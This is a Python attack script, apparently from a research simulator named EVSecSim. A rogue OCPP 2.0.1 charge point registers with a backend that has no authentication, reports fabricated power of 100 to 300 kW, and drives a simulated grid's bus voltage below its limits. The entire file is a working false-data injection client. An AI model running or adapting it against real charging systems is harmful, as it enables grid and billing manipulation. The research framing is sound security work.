"""
===========================================================================
EVSecSim — OCPP 2.0.1 Attack: Single EVSE Grid Overload + PGTwin
===========================================================================

WHAT THIS IS
------------
The 2.0.1 re-implementation of Attack #7 (attacks/attack_overload_grid.py).
A single rogue charger reports progressively inflated power via
TransactionEvent[Updated] and, exactly as the 1.6 version did, writes the
aggregated kW to the shared Docker volume (/shared/ev_load_kw.txt) that
the PGTwin grid simulator reads before every runpp().

WHY THE GRID NUMBERS ARE UNCHANGED
----------------------------------
PGTwin never parses OCPP — it reads a float from the shared file.  The
grid impact comes entirely from that float, so the 2.0.1 overload drives
exactly the same Bus 44 voltage sag as the 1.6 version:

  EV load    Bus 44 vm_pu    (verified, identical for 1.6 and 2.0.1)
  ----------------------------------------------------------------
    0 kW     0.9689   387.6 V  baseline
  100 kW     0.9418   376.7 V  below IEC 0.95 limit
  200 kW     0.9093   363.7 V  protection relay risk
  300 kW     0.8694   347.8 V  13% below nominal

The NOVEL evidence in this 2.0.1 track is CSMS-side: the 2.0.1 CSMS
accepting and logging the fabricated TransactionEvent power with no
plausibility check, just as the 1.6 CSMS did.  The grid coupling and the
resulting staircase are reused, not re-derived.

WHY IT STILL WORKS ON 2.0.1
---------------------------
Same data-integrity / authenticated-insider argument as the FDI attack:
2.0.1 has no plausibility check on reported power.  Independent of
security profile.

THREAT MODEL
------------
Single rogue EVSE on public-net.  No CP authentication in the plaintext
(Profile-1 equivalent) deployment — any client connects and reports any
power value.

HOW TO RUN
----------
  docker compose --profile v201-overload-grid up
===========================================================================
"""

import asyncio
import os
import time
import websockets
from datetime import datetime, timezone

from ocpp.v201 import ChargePoint as cp, call
from ocpp.v201.enums import RegistrationStatusEnumType

# ===========================================================================
# CONFIG
# ===========================================================================

CSMS_URL          = os.environ.get("CSMS_URL", "ws://127.0.0.1:9100")
EV_LOAD_FILE      = os.environ.get("EV_LOAD_FILE", "/shared/ev_load_kw.txt")
CP_ID             = os.environ.get("CP_ID", "ATK-201-OVERLOAD-001")
TX_ID             = "TX-201-OVERLOAD"

OVERLOAD_STEPS_KW = [0.0, 100.0, 200.0, 300.0, 0.0]   # kW per step
STEP_DURATION_S   = 20
METER_INTERVAL_S  = 2

# Verified PGTwin response (identical for 1.6 and 2.0.1 — grid reads a float)
EXPECTED_VM_PU = {0.0: "0.9689", 100.0: "0.9418", 200.0: "0.9093", 300.0: "0.8694"}

# ===========================================================================
# COLOUR
# ===========================================================================

RED, YELLOW, GREEN, CYAN, BOLD, RESET = (
    "\033[91m", "\033[93m", "\033[92m", "\033[96m", "\033[1m", "\033[0m")

def ts():
    return datetime.now().strftime("%H:%M:%S")

def now():
    return datetime.now(timezone.utc).isoformat()

def log_atk(m):  print(f"{RED}[ATK {ts()}]{RESET} {m}")
def log_grid(m): print(f"{CYAN}[GRD {ts()}]{RESET} {m}")
def log_ok(m):   print(f"{GREEN}[OK  {ts()}]{RESET} {m}")

def write_ev_load(kw: float):
    try:
        os.makedirs(os.path.dirname(EV_LOAD_FILE), exist_ok=True)
        with open(EV_LOAD_FILE, "w") as f:
            f.write(str(round(kw, 3)))
    except Exception as e:
        print(f"[ATK-201] EV load file write error: {e}")

# ===========================================================================
# ROGUE 2.0.1 CHARGE POINT
# ===========================================================================

class OverloadEVSEv201(cp):

    async def register(self) -> bool:
        resp = await self.call(call.BootNotification(
            charging_station={"model": "OverloadCP-201", "vendor_name": "Rogue-Vendor"},
            reason="PowerUp",
        ))
        return resp.status == RegistrationStatusEnumType.accepted

    async def start_tx(self):
        await self.call(call.TransactionEvent(
            event_type="Started", timestamp=now(),
            trigger_reason="ChargingStateChanged", seq_no=0,
            transaction_info={"transaction_id": TX_ID},
        ))

    async def report(self, seq: int, power_kw: float):
        await self.call(call.TransactionEvent(
            event_type="Updated", timestamp=now(),
            trigger_reason="MeterValuePeriodic", seq_no=seq,
            transaction_info={"transaction_id": TX_ID},
            meter_value=[{
                "timestamp": now(),
                "sampledValue": [{
                    "value": round(power_kw, 2),
                    "measurand": "Power.Active.Import",
                    "unitOfMeasure": {"unit": "kW"},
                }],
            }],
        ))
        write_ev_load(power_kw)   # drive the shared grid file, as in 1.6

# ===========================================================================
# MAIN
# ===========================================================================

async def main():
    print(f"\n{BOLD}{RED}{'='*62}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim — OCPP 2.0.1 Single EVSE Grid Overload{RESET}")
    print(f"{BOLD}{RED}{'='*62}{RESET}\n")
    print(f"  CSMS (2.0.1)   : {CSMS_URL}")
    print(f"  EV load file   : {EV_LOAD_FILE}")
    print(f"  Load steps     : {OVERLOAD_STEPS_KW} kW")
    print(f"  Grid target    : Load4 Bus 44 (DS4, 0.4 kV) via shared volume")
    print(f"  Message model  : TransactionEvent[Updated]  (vs 1.6 MeterValues)\n")

    os.makedirs(os.path.dirname(EV_LOAD_FILE), exist_ok=True)

    try:
        async with websockets.connect(CSMS_URL, ping_interval=None) as ws:
            await ws.send(CP_ID)
            evse = OverloadEVSEv201(CP_ID, ws)
            start_task = asyncio.create_task(evse.start())
            await asyncio.sleep(0.1)

            if not await evse.register():
                print(f"{RED}Registration failed — is the 2.0.1 CSMS running?{RESET}")
                start_task.cancel()
                return
            log_ok("Registered with 2.0.1 CSMS — no CP authentication required")
            await evse.start_tx()

            seq = 1
            for i, step_kw in enumerate(OVERLOAD_STEPS_KW):
                if step_kw == 0.0 and i == 0:
                    label, colour = "BASELINE — no EV load", GREEN
                elif step_kw == 0.0:
                    label, colour = "CLEANUP — load cleared, bus recovers", GREEN
                else:
                    label, colour = f"OVERLOAD STEP {i} — {step_kw:.0f} kW reported", RED

                print(f"\n{BOLD}{colour}{'='*62}{RESET}")
                print(f"{BOLD}{colour}  {label}{RESET}")
                if step_kw in EXPECTED_VM_PU:
                    print(f"{BOLD}{colour}  expected Bus 44 vm_pu = {EXPECTED_VM_PU[step_kw]} "
                          f"(grid reads shared float — identical to 1.6){RESET}")
                print(f"{BOLD}{colour}{'='*62}{RESET}\n")

                t0 = time.perf_counter(); tick = 0
                while time.perf_counter() - t0 < STEP_DURATION_S:
                    await evse.report(seq, step_kw); seq += 1; tick += 1
                    log_grid(f"Step {i} | {step_kw:6.1f} kW → TransactionEvent + ev_load_kw.txt | tick {tick:2d}")
                    await asyncio.sleep(METER_INTERVAL_S)

            write_ev_load(0.0)
            log_ok("Grid load cleared — Bus 44 returning to baseline vm_pu")

            print(f"\n{BOLD}{CYAN}{'='*62}{RESET}")
            print(f"{BOLD}{CYAN}  OCPP 2.0.1 OVERLOAD COMPLETE{RESET}")
            print(f"{BOLD}{CYAN}{'='*62}{RESET}\n")
            print(f"  {YELLOW}CSMS-side evidence (novel for 2.0.1):{RESET}")
            print(f"  - CSMS-v201 logged each fabricated TransactionEvent power")
            print(f"    (100/200/300 kW) with no plausibility check")
            print()
            print(f"  {YELLOW}Grid evidence (reused — identical to 1.6, grid reads a float):{RESET}")
            print(f"  - SimOutputBus.csv column vm_pu45 (Bus 44):")
            print(f"      100 kW → 0.9418 pu   200 kW → 0.9093 pu   300 kW → 0.8694 pu")
            print()
            print(f"  Key finding : grid-impact attack survives the 1.6 → 2.0.1 migration.")
            print(f"                The vulnerability is at the data layer; the protocol")
            print(f"                version changes the message envelope, not the outcome.")

            start_task.cancel()
            try:
                await start_task
            except (asyncio.CancelledError, websockets.exceptions.ConnectionClosedOK):
                pass

    except ConnectionRefusedError:
        print(f"{RED}Cannot reach 2.0.1 CSMS at {CSMS_URL}{RESET}")
    except KeyboardInterrupt:
        write_ev_load(0.0)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        write_ev_load(0.0)
